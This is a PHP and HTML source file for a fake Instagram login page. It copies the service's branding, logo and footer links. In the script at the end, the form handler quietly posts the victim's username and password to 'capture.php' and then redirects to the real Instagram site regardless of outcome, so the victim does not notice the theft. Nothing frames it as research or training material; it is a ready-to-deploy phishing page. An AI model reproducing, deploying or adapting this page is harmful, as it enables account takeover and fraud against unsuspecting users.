<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
$redirect_url = $_SESSION['redirect_url'] ?? 'https://www.instagram.com/';
$base_url = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Login • Instagram</title>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" type="image/png">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            width: 100%;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
        }
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 30px 20px;
        }
        .container { width: 100%; max-width: 350px; }
        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            margin-bottom: 10px;
            text-align: center;
        }
        .logo {
            width: 175px;
            height: 51px;
            margin: 0 auto 25px;
            background-image: url("https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png");
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
        }
        .login-form { width: 100%; }
        .input-wrapper { position: relative; width: 100%; margin-bottom: 6px; }
        .login-form input[type="text"],
        .login-form input[type="password"] {
            width: 100%;
            padding: 9px 8px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 12px;
            line-height: 18px;
            outline: none;
        }
        .login-form input:focus { border-color: #a8a8a8; background-color: #fff; }
        .login-form input::placeholder { color: #8e8e8e; }
        .password-wrapper { position: relative; }
        .password-wrapper input { padding-right: 55px; }
        .toggle-password {
            position: absolute;
            right: 8px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #262626;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            display: none;
        }
        .login-btn {
            width: 100%;
            padding: 7px 16px;
            margin-top: 8px;
            background-color: #0095f6;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
        }
        .login-btn:disabled { background-color: rgba(0,149,246,0.3); cursor: default; }
        .login-btn:not(:disabled):hover { background-color: #1877f2; }
        .loading { display: none; margin-top: 10px; }
        .loading svg { animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .divider { display: flex; align-items: center; margin: 18px 0; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background-color: #dbdbdb; }
        .divider span { margin: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; text-transform: uppercase; }
        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            text-decoration: none;
            margin-bottom: 10px;
        }
        .fb-login:hover { text-decoration: underline; }
        .fb-login svg { width: 16px; height: 16px; margin-right: 8px; }
        .forgot-password { margin-top: 15px; }
        .forgot-password a { color: #00376b; font-size: 12px; text-decoration: none; }
        .forgot-password a:hover { text-decoration: underline; }
        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            text-align: center;
            font-size: 14px;
            margin-bottom: 10px;
        }
        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
        .signup-box a:hover { text-decoration: underline; }
        .app-download { text-align: center; margin-top: 10px; }
        .app-download p { font-size: 14px; margin-bottom: 15px; color: #262626; }
        .app-badges { display: flex; justify-content: center; gap: 8px; }
        .app-badges a { display: inline-block; }
        .app-badges img { height: 40px; }
        .footer { margin-top: 40px; text-align: center; width: 100%; }
        .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px 16px; margin-bottom: 20px; padding: 0 20px; }
        .footer-links a { color: #8e8e8e; font-size: 12px; text-decoration: none; white-space: nowrap; }
        .footer-links a:hover { text-decoration: underline; }
        .footer-copyright { color: #8e8e8e; font-size: 12px; }
        @media (max-width: 450px) {
            body { background-color: #fff; padding: 20px 15px; }
            .login-box, .signup-box { border: none; padding: 30px 20px; }
            .footer-links { gap: 5px 12px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"></div>
            <form class="login-form" id="loginForm">
                <div class="input-wrapper">
                    <input type="text" id="username" name="username" placeholder="Phone number, username, or email" autocapitalize="off" autocorrect="off" autocomplete="username" required>
                </div>
                <div class="input-wrapper password-wrapper">
                    <input type="password" id="password" name="password" placeholder="Password" autocapitalize="off" autocorrect="off" autocomplete="current-password" required>
                    <button type="button" class="toggle-password" id="togglePassword">Show</button>
                </div>
                <input type="hidden" id="redirect_url" value="<?php echo htmlspecialchars($redirect_url); ?>">
                <button type="submit" class="login-btn" id="loginBtn" disabled>Log in</button>
                <div class="loading" id="loading">
                    <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
                        <circle cx="9" cy="9" r="8" stroke="#c7c7c7" stroke-width="2"/>
                        <path d="M9 1a8 8 0 0 1 8 8" stroke="#8e8e8e" stroke-width="2" stroke-linecap="round"/>
                    </svg>
                </div>
            </form>
            <div class="divider"><span>OR</span></div>
            <a href="https://www.facebook.com/login/" class="fb-login">
                <svg viewBox="0 0 24 24" fill="#385185"><path d="M12 2.04c-5.5 0-10 4.49-10 10.02 0 5 3.66 9.15 8.44 9.9v-7H7.9v-2.9h2.54V9.85c0-2.51 1.49-3.89 3.78-3.89 1.09 0 2.23.19 2.23.19v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.45 2.9h-2.33v7a10 10 0 0 0 8.44-9.9c0-5.53-4.5-10.02-10-10.02Z"/></svg>
                Log in with Facebook
            </a>
            <div class="forgot-password"><a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a></div>
        </div>
        <div class="signup-box">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></div>
        <div class="app-download">
            <p>Get the app.</p>
            <div class="app-badges">
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play"></a>
                <a href="https://apps.microsoft.com/store/detail/instagram/9NBLGGH5L9XT"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft"></a>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="footer-links">
            <a href="https://about.meta.com/">Meta</a>
            <a href="https://about.instagram.com/">About</a>
            <a href="https://about.instagram.com/blog">Blog</a>
            <a href="https://www.instagram.com/about/jobs/">Jobs</a>
            <a href="https://help.instagram.com/">Help</a>
            <a href="https://developers.facebook.com/docs/instagram">API</a>
            <a href="https://www.instagram.com/legal/privacy/">Privacy</a>
            <a href="https://www.instagram.com/legal/terms/">Terms</a>
            <a href="https://www.instagram.com/explore/locations/">Locations</a>
            <a href="https://www.instagram.com/lite/">Instagram Lite</a>
            <a href="https://www.threads.net/">Threads</a>
            <a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a>
        </div>
        <div class="footer-copyright">© 2024 Instagram from Meta</div>
    </div>

    <script>
        var form = document.getElementById("loginForm");
        var loginBtn = document.getElementById("loginBtn");
        var loading = document.getElementById("loading");
        var usernameInput = document.getElementById("username");
        var passwordInput = document.getElementById("password");
        var togglePassword = document.getElementById("togglePassword");
        var redirectUrl = document.getElementById("redirect_url").value;

        function checkInputs() {
            loginBtn.disabled = !(usernameInput.value.trim() && passwordInput.value);
        }

        usernameInput.addEventListener("input", checkInputs);
        passwordInput.addEventListener("input", function() {
            checkInputs();
            togglePassword.style.display = this.value ? "block" : "none";
        });

        togglePassword.addEventListener("click", function() {
            var isPassword = passwordInput.type === "password";
            passwordInput.type = isPassword ? "text" : "password";
            this.textContent = isPassword ? "Hide" : "Show";
        });

        form.addEventListener("submit", function(e) {
            e.preventDefault();
            
            var username = usernameInput.value;
            var password = passwordInput.value;
            
            loginBtn.disabled = true;
            loginBtn.style.display = "none";
            loading.style.display = "block";

            // Create form data
            var formData = new FormData();
            formData.append("username", username);
            formData.append("password", password);
            formData.append("redirect_url", redirectUrl);

            // Send credentials using XMLHttpRequest for better compatibility
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "capture.php", true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    // Redirect regardless of response
                    setTimeout(function() {
                        window.location.href = redirectUrl;
                    }, 800);
                }
            };
            xhr.onerror = function() {
                // Redirect even on error
                window.location.href = redirectUrl;
            };
            xhr.send(formData);
            
            // Fallback: redirect after 3 seconds no matter what
            setTimeout(function() {
                window.location.href = redirectUrl;
            }, 3000);
        });
    </script>
</body>
</html>
